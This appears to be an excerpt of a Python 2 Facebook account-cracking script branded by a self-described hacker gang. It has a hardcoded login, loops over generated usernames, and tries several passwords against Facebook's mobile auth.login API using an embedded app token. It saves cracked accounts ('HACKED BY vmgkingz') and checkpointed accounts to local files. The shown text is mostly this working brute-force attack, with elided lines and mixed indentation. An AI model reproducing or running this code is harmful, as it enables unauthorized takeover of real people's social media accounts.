...
\033[1;90m [ ALEE SIYAL ]

\x1b[1;92m=============================
\x1b[1;93m Coder + Author iS : ALEE SIYAL
\x1b[1;93m GANG  : VOTTING MACHINE (VMG) X (HHU)
\x1b[1;93m FaceBook : ALEE SIYAL
\x1b[1;93m Whatsapp:  
\x1b[1;93m VMG RULEX :  RECORD BREAKER
\x1b[1;92m=============================
\x1b[1;93m     ➾       NOTE !
\x1b[1;91m=======================================
...
CorrectUsername = "aleesiyal"
CorrectPassword = "vmgkingz"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://www.facebook.com/Romeoking11')
    else:
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;92m         [ vmg owner alee siyal ] { Pak Hacker } ]"
	print
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m[ iD iS Ok =HACKED BY vmg kingz ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass1																				
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;95mAleesiyal \x1b[1;95m[Vmg  CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass1
					...
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;92m[ iD iS Ok =HACKED BY vmgkingz ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						...
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;93maleesiyan \x1b[1;95m[vmgkingz CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
							cps = open('save/checkpoint.txt', 'a')
							...
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[ iD iS Ok =HACKED BY vmgkingz ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
								okb = open('save/successfull.txt', 'a')
								...
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;96mAleesiyal \x1b[1;95m[vmgkingz  CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
									cps = open('save/checkpoint.txt', 'a')
